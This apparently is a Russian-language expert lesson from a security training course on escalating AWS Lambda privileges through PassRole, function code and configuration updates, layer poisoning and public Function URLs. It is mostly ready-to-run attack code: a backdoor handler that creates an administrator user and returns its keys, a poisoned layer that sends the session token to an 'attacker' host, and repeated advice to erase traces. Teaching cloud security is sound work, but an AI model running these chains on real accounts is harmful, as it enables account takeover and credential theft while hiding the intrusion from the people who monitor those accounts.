---
id: cloud-lambda-privesc
title: "Lambda: эскалация через роль, слои и конфигурацию функции"
category: cloud
parent: cloud-serverless
difficulty: expert
order: 2
tags: [cloud, aws, lambda, privesc, passrole, layer, function-url]
prerequisites: [cloud-serverless, cloud-serverless-injection]
useful_for:
  - "Эскалация привилегий через Lambda"
  - "Злоупотребление iam:PassRole и update-function"
  - "Понимание serverless-эскалации"
estimated_minutes: 55
summary: "Как из ограниченных прав в Lambda добраться до администратора: iam:PassRole + update-function-configuration, отравление слоёв, Function URL и переменные окружения. Практические цепочки."
---

Lambda — не только цель, но и инструмент эскалации. Если у вас есть права на управление функцией (`UpdateFunctionCode`, `UpdateFunctionConfiguration`) и `iam:PassRole`, вы можете заставить Lambda работать с более привилегированной ролью — а значит, действовать с её правами. Урок про конкретные цепочки.

## Ключевые права-примитивы

| Право | Что даёт |
|-------|----------|
| `lambda:UpdateFunctionCode` | Подменить код функции → выполнить свой код с её ролью |
| `lambda:UpdateFunctionConfiguration` | Сменить роль/env/слой функции |
| `iam:PassRole` | Передать роль функции (нужно вместе с Create/Update) |
| `lambda:CreateFunction` | Создать новую функцию с любой доступной ролью |
| `lambda:InvokeFunction` | Вызвать функцию (в т.ч. чужую) |
| `lambda:AddPermission` | Разрешить внешний вызов (resource-based policy) |
| `lambda:CreateEventSourceMapping` | Привязать источник событий |

## Цепочка 1: UpdateFunctionCode + PassRole

Если функция `target-fn` имеет роль `AdminRole`, а у вас есть `UpdateFunctionCode`:

```bash
# Сохранить оригинальный код (для заметания следов)
aws lambda get-function --function-name target-fn \
  --query 'Code.Location' --output text | xargs curl -o orig.zip

# Загрузить свой код, который использует роль функции
cat > backdoor.py <<'PY'
import boto3, os
def handler(event, context):
    iam = boto3.client('iam')
    # создать админ-пользователя
    try:
        iam.create_user(UserName='svc-backup')
        iam.attach_user_policy(UserName='svc-backup',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        key = iam.create_access_key(UserName='svc-backup')['AccessKey']
        return key
    except Exception as e:
        return str(e)
PY
zip backdoor.zip backdoor.py
aws lambda update-function-code --function-name target-fn \
  --zip-file fileb://backdoor.zip
aws lambda invoke --function-name target-fn out.json
cat out.json     # новые админ-ключи
```

## Цепочка 2: UpdateFunctionConfiguration + PassRole

Меняем роль функции на более привилегированную (если есть PassRole на неё):

```bash
aws lambda update-function-configuration --function-name my-fn \
  --role arn:aws:iam::123:role/AdminRole
aws lambda invoke --function-name my-fn out.json   # теперь функция = админ
```

Или меняем переменные окружения на креды другой роли:

```bash
aws lambda update-function-configuration --function-name my-fn \
  --environment 'Variables={AWS_ACCESS_KEY_ID=<admin>,AWS_SECRET_ACCESS_KEY=<...>}'
```

## Цепочка 3: отравление слоёв

Слой — общий код для нескольких функций. Если у вас есть `lambda:PublishLayerVersion` и права обновить функцию, использующую слой:

```bash
# Публикуем слой с backdoor, который исполняется при импорте
mkdir -p layer/python && cat > layer/python/sitecustomize.py <<'PY'
import os, urllib.request
try:
    urllib.request.urlopen("https://attacker/?t=" + os.environ.get("AWS_SESSION_TOKEN",""))
except Exception:
    pass
PY
cd layer && zip -r ../layer.zip . && cd ..
aws lambda publish-layer-version --layer-name common-utils \
  --zip-file fileb://layer.zip --compatible-runtimes python3.12
# Обновляем функции, использующие слой, на новую версию
aws lambda update-function-configuration --function-name victim \
  --layers arn:aws:lambda:us-east-1:123:layer:common-utils:2
```

`sitecustomize.py` исполняется Python-рантаймом автоматически при старте.

## Цепочка 4: Function URL и AddPermission

Если функция имеет широкую роль, но вызывать её снаружи нельзя — добавляем разрешение:

```bash
aws lambda add-permission --function-name target \
  --statement-id ext --action lambda:InvokeFunctionUrl \
  --principal '*' --function-url-auth-type NONE
# Теперь функцию можно вызвать по URL
curl https://<fn-url>/
```

## Разобранный пример: из разработчика в админа

**Дано:** пользователь `dev` с правами `lambda:UpdateFunctionConfiguration`, `lambda:InvokeFunction` и `iam:PassRole` на `arn:aws:iam::123:role/DeployRole` (`AdministratorAccess`).

1. Находим функцию, к которой есть доступ:

```bash
aws lambda list-functions --query 'Functions[].FunctionName'
aws lambda get-function-configuration --function-name build-fn --query 'Role'
```

2. Меняем роль функции на привилегированную:

```bash
aws lambda update-function-configuration --function-name build-fn \
  --role arn:aws:iam::123:role/DeployRole
```

3. Подменяем код на «создать ключ» (Цепочка 1) и вызываем.
4. Получаем админ-ключи, проверяем, прибираем следы:

```bash
aws lambda update-function-configuration --function-name build-fn \
  --role arn:aws:iam::123:role/original-role
```

## Частые ошибки

- **Забыть вернуть оригинальный код/роль.** Заметание следов обязательно.
- **Считать, что `InvokeFunction` безвредно.** Вызов функции = выполнение её кода с её ролью.
- **Игнорировать слои.** Отравленный слой заражает все функции, которые его используют.
- **Путать права на функцию и права роли.** Нужно и то, и другое.
- **Не проверять Function URL.** Публичный URL — вход без `AddPermission`.
- **Забывать про `CAPABILITY`.** Часть операций требует дополнительных разрешений.

## Что дальше / решение

- Есть `UpdateFunctionCode` → подмена кода с ролью функции.
- Есть `UpdateFunctionConfiguration` + `PassRole` → смена роли/env/слоя.
- Есть `PublishLayerVersion` → отравление общего слоя.
- Есть `AddPermission` → экспозиция функции наружу.
- Смежные уроки: `cloud-serverless`, `cloud-serverless-injection`, `cloud-privesc-iam`.

## Полный каталог примитивов

| Право | Эффект |
|-------|--------|
| lambda:UpdateFunctionCode | выполнить свой код с ролью функции |
| lambda:UpdateFunctionConfiguration | сменить роль/env/layers |
| lambda:CreateFunction + iam:PassRole | новая функция с ролью |
| lambda:InvokeFunction | запустить функцию (и код) |
| lambda:AddPermission | Function URL / политика |
| iam:PassRole | передать роль функции |
| lambda:PublishLayerVersion | отравление слоя |

## Разобранный пример 2: отравление слоя

Функция использует слой `common-libs:3`. Если есть `PublishLayerVersion`, публикуем новую версию того же слоя с backdoor, затем `UpdateFunctionConfiguration` переключает функцию на неё. Код слоя исполняется в контексте функции — вы получаете её роль.

```bash
zip -r layer.zip python/
aws lambda publish-layer-version --layer-name common-libs \
  --zip-file fileb://layer.zip --compatible-runtimes python3.12
aws lambda update-function-configuration --function-name app \
  --layers arn:aws:lambda:...:layer:common-libs:4
aws lambda invoke --function-name app out.txt
```

## Практическое задание

В тестовом аккаунте создайте функцию с ролью, имеющей доступ к S3. Дайте пользователю только `lambda:UpdateFunctionCode`. Загрузите код, читающий S3 и возвращающий содержимое. Убедитесь, что пользователь без прямого доступа к S3 получил данные. Это наглядно показывает, почему `UpdateFunctionCode` — примитив эскалации.

## Почему Lambda — удобный мост

Lambda не требует сети и времени на загрузку, как EC2. С `UpdateFunctionCode` и `PassRole` вы выполняете код от имени роли функции за секунды, получая её права. Часто роль функции шире, чем у разработчика, — поэтому это популярный путь эскалации. Минимизируйте права функций и ограничивайте PassRole.

## Чек-лист

1. Перечислить функции и их роли.
2. Проверить права `UpdateFunctionCode`, `UpdateFunctionConfiguration`, `PassRole`, `PublishLayerVersion`.
3. Выполнить свой код с ролью функции (UpdateFunctionCode).
4. Извлечь креды роли из env/IMDS.
5. Проверить, какие слои используются, — оценить риск отравления.
6. Для защиты — минимизировать PassRole и права функций.

## Function URL и AddPermission

`lambda:AddPermission` с `Action: lambda:InvokeFunctionUrl` и `Principal: *` делает функцию публичной — её можно вызвать без аутентификации, что при инъекции даёт удалённое выполнение. Проверьте `aws lambda get-policy --function-name X` и наличие Function URL (`get-function-url-config`). Публичный URL + SSRF/инъекция = внешний RCE.

## Переменные окружения как источник секретов

```bash
aws lambda get-function-configuration --function-name app \
  --query 'Environment.Variables'
```

Если у вас есть `lambda:GetFunctionConfiguration`, вы читаете env функции — часто там ключи БД и API. В сочетании с `UpdateFunctionConfiguration` можно подменить env, но это заметно. Тише — просто прочитать существующие секреты. Комбинируйте с `UpdateFunctionCode` для получения роли.

## Быстрая проверка

```bash
aws lambda list-functions --query 'Functions[].{Name:FunctionName,Role:Role}'
aws lambda get-function-configuration --function-name app --query Environment
aws lambda get-policy --function-name app
```

Ищите функции с широкими ролями, env-секретами и публичным Function URL. Комбинация UpdateFunctionCode + PassRole — самый быстрый путь к эскалации.

## Квиз

```quiz
- question: "Что даёт lambda:UpdateFunctionCode атакующему?"
  options:
    - "Возможность выполнить свой код с ролью функции"
    - "Только чтение логов"
    - "Только смену таймаута"
    - "Ничего без root"
  answer: 0
  explanation: "Подмена кода = исполнение с правами execution role."
- question: "Какое право нужно вместе с UpdateFunctionConfiguration для смены роли?"
  options:
    - "iam:PassRole"
    - "s3:ListBucket"
    - "ec2:Describe"
    - "logs:GetLogEvents"
  answer: 0
  explanation: "Передать роль функции можно только с PassRole."
- question: "Почему отравление слоя опасно?"
  options:
    - "Слой общий для многих функций, и его код исполняется при старте"
    - "Он шифрует данные"
    - "Он удаляет функции"
    - "Он безвреден"
  answer: 0
  explanation: "Один слой заражает все использующие его функции."
- question: "Что делает lambda:AddPermission с principal *?"
  options:
    - "Разрешает внешний вызов функции (например, Function URL)"
    - "Удаляет функцию"
    - "Меняет регион"
    - "Отключает IAM"
  answer: 0
  explanation: "Resource-based policy открывает вызов наружу."
- question: "Зачем сохранять оригинальный код функции перед подменой?"
  options:
    - "Чтобы вернуть всё на место и не оставить следов"
    - "Чтобы ускорить вызов"
    - "Чтобы снизить счёт"
    - "Чтобы включить логи"
  answer: 0
  explanation: "Восстановление исходного состояния — часть OPSEC."
```

## Где пригодится

- **Red team:** serverless как инструмент эскалации в AWS.
- **Пентест:** аудит прав на Lambda и PassRole.
- **CTF:** задачи с цепочками IAM → Lambda → админ.
- **Работа/DevSecOps:** ограничение PassRole, защита слоёв, аудит update-операций.
- **Дальше по дереву:** `cloud-serverless`, `cloud-privesc-iam`.
